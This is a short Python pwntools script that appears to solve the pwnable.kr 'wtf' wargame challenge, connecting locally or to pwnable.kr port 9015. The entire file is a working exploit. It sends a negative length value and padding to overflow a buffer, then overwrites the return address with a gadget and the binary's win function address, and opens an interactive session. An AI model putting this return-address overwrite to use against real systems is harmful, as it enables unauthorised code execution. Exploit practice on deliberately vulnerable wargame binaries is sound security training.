#!/usr/bin/env python3

from pwn import *

exe = ELF("./wtf")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript='c\nb *0x04006b8')
    else:
        r = remote('pwnable.kr', 9015)

    return r


def main():
    r = conn()
    sleep(2)


    payload = b'-1 ' + b'A'*(4096-1-3) + b'\n' +  b'A'*56 + p64(0x04006c3) + p64(exe.sym.win)  +b'\n'
    r.recvuntil(b'payload please : ')
    r.send(enhex(payload))
    #print(b'-1 ' + b'A'*(4096-1-3) + b'\n' + payload)
    #sleep(1)
    #r.send(payload)


    r.interactive()


if __name__ == "__main__":
    main()
